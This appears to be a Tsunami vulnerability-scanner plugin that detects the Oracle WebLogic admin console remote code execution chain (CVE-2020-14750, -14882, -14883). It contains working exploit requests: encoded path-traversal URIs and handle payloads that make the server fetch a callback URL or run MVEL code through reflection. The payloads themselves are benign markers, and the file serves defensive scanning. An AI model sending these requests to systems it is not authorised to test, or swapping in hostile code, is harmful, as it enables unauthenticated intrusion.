# proto-file: github.com/google/tsunami-security-scanner-plugins/templated/templateddetector/proto/templated_plugin.proto
# proto-message: TemplatedPlugin

###############
# PLUGIN INFO #
###############

info: {
  type: VULN_DETECTION
  name: "OracleWebLogic_CVE_2020_14883"
  author: "Google"
  version: "1.0"
}

finding: {
  main_id: {
    publisher: "GOOGLE"
    value: "CVE_2020_14883"
  }
  severity: CRITICAL
  title: "Oracle WebLogic Admin Console RCE (CVE-2020-14750, CVE-2020-14882, CVE-2020-14883)"
  description:
    "A remote code execution vulnerability chain exists in the Oracle WebLogic"
    " Server Administration Console component (CVE-2020-14750, CVE-2020-14882,"
    " CVE-2020-14883). Unauthenticated attackers can bypass console"
    " authentication via double URL-encoded path traversal into console.portal"
    " and instantiate arbitrary Java handle classes to execute code. Versions"
    " 10.3.6.0.0, 12.1.3.0.0, 12.2.1.3.0, 12.2.1.4.0, and 14.1.1.0.0 are"
    " affected."
  recommendation:
    "Apply the Oracle October 2020 Critical Patch Update and the November 2020"
    " Out-of-Band Security Alert patch for CVE-2020-14750 (see"
    " https://www.oracle.com/security-alerts/alert-cve-2020-14750.html), and"
    " restrict network access to the WebLogic Administration Console."
  related_id: [
    {
      publisher: "CVE"
      value: "CVE-2020-14750"
    },
    {
      publisher: "CVE"
      value: "CVE-2020-14882"
    },
    {
      publisher: "CVE"
      value: "CVE-2020-14883"
    }
  ]
}

config: {}

###########
# ACTIONS #
###########

actions: {
  name: "fingerprint_weblogic_console"
  action_phase: ACTION_PHASE_FINGERPRINT
  http_request: {
    method: GET
    uri: "/console/login/LoginForm.jsp"
    response: {
      http_status: 200
      expect_all: {
        conditions: [
          { body: {} contains: "j_security_check" },
          { body: {} contains: "wlsconsole" }
        ]
      }
    }
  }
}

# Out-of-band callback probes using Spring FileSystemXmlApplicationContext,
# which triggers an immediate benign HTTP GET request to {{ T_CBS_URI }} across
# all vulnerable WebLogic versions (10.3.6.0.0 through 14.1.1.0.0) on both Linux
# and Windows without spawning an external OS shell. Sent via two sequential
# actions covering both the CVE-2020-14750 mixed-dot bypass (.%252e/) and the
# CVE-2020-14882 double-encoded traversal (%252e%252e%252f).
actions: {
  name: "trigger_spring_xml_callback_mixed_dot"
  http_request: {
    method: POST
    uri: "/console/images/.%252e/console.portal"
    headers: [
      { name: "Content-Type" value: "application/x-www-form-urlencoded" }
    ]
    data: "_nfpb=true&_pageLabel=&handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext(%22{{ T_CBS_URI }}%22)"
    client_options: {
      disable_follow_redirects: true
      ignore_http_client_errors: true
    }
  }
}

actions: {
  name: "trigger_spring_xml_callback_css"
  http_request: {
    method: POST
    uri: "/console/css/%252e%252e%252fconsole.portal"
    headers: [
      { name: "Content-Type" value: "application/x-www-form-urlencoded" }
    ]
    data: "_nfpb=true&_pageLabel=&handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext(%22{{ T_CBS_URI }}%22)"
    client_options: {
      disable_follow_redirects: true
      ignore_http_client_errors: true
    }
  }
}

actions: {
  name: "sleep_for_callback"
  utility: {
    sleep: {
      duration_ms: 3500
    }
  }
}

actions: {
  name: "verify_callback_interaction"
  callback_server: {
    action_type: CHECK
  }
}

# In-band fallback when no callback server is configured: evaluates an MVEL
# arithmetic product inside Coherence ShellSession on WebLogic 12.2.1.x / 14.1.1
# using explicit private-field reflection when getCurrentWork() wraps
# connectionHandler, and writes the computed token into X-Tsunami-Weblogic.
actions: {
  name: "trigger_mvel_inband_arithmetic"
  http_request: {
    method: POST
    uri: [
      "/console/images/.%252e/console.portal",
      "/console/css/%252e%252e%252fconsole.portal"
    ]
    headers: [
      { name: "Content-Type" value: "application/x-www-form-urlencoded" }
    ]
    data: "_nfpb=true&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession(%22t%3DThread.currentThread()%3Bw%3Dt.getCurrentWork()%3Breq%3Dnull%3Bif(w.getClass().getName().endsWith('ServletRequestImpl'))%7Breq%3Dw%3B%7Delse%7Bf%3Dw.getClass().getDeclaredField('connectionHandler')%3Bf.setAccessible(true)%3Bch%3Df.get(w)%3Bm%3Dch.getClass().getDeclaredMethod('getServletRequest')%3Bm.setAccessible(true)%3Breq%3Dm.invoke(ch)%3B%7Dout%3D'TSUNAMI_'.concat(String.valueOf(4139*7919))%3Bres%3Dreq.getResponse()%3Bres.setHeader('X-Tsunami-Weblogic'%2Cout)%3Bsos%3Dres.getServletOutputStream()%3Bsos.write(out.getBytes())%3Bsos.flush()%3Bres.flushBuffer()%3B%22)"
    client_options: {
      disable_follow_redirects: true
      ignore_http_client_errors: true
    }
    response: {
      expect_all: {
        conditions: [
          { header: { name: "X-Tsunami-Weblogic" } contains: "TSUNAMI_32776741" }
        ]
      }
    }
  }
}

#############
# WORKFLOWS #
#############

workflows: {
  condition: REQUIRES_CALLBACK_SERVER
  actions: [
    "fingerprint_weblogic_console",
    "trigger_spring_xml_callback_mixed_dot",
    "trigger_spring_xml_callback_css",
    "sleep_for_callback",
    "verify_callback_interaction"
  ]
}

workflows: {
  actions: [
    "fingerprint_weblogic_console",
    "trigger_mvel_inband_arithmetic"
  ]
}
